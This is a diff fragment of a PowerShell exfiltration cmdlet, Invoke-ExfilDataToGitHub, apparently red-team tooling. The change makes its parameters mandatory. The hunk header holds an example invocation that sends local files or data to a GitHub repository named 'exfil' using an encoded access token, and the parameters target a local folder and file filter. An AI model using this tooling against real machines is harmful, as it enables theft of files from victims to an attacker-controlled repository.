@@ -51,35 +51,35 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
     [CmdletBinding()] Param(
 
-        [Parameter(Position = 0, Mandatory = $False)]
+        [Parameter(Position = 0, Mandatory = $True)]
         [String]
         $GHUser = "nnh100",
 
-        [Parameter(Position = 1, Mandatory = $False)]
+        [Parameter(Position = 1, Mandatory = $True)]
         [String]
         $GHRepo = "exfil",
 
-        [Parameter(Position = 2, Mandatory = $False)]
+        [Parameter(Position = 2, Mandatory = $True)]
         [String]
         $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==", # This should be base 64 encoded
 
-        [Parameter(Position =3, Mandatory = $False)]
+        [Parameter(Position =3, Mandatory = $True)]
         [String]
         $GHFilePath = "testfolder2/",
 
-        [Parameter(Position = 4, Mandatory=$False, ParameterSetName="ExfilFilesFromFilePath")]
+        [Parameter(Position = 4, Mandatory=$True, ParameterSetName="ExfilFilesFromFilePath")]
         [String]
         $LocalFilePath = "C:\temp\",
 
-        [Parameter(Position = 4, Mandatory = $False, ParameterSetName="ExfilDataToFile")]
+        [Parameter(Position = 4, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
         [String]
         $GHFileName = "testfile1",
 
-        [Parameter(Position = 5, Mandatory = $False, ParameterSetName="ExfilFilesFromFilePath")]
+        [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilFilesFromFilePath")]
         [String]
         $Filter = "*.*",
 
-        [Parameter(Position = 5, Mandatory = $False, ParameterSetName="ExfilDataToFile")]
+        [Parameter(Position = 5, Mandatory = $True, ParameterSetName="ExfilDataToFile")]
         [Object]
         $Data = "test data"
 
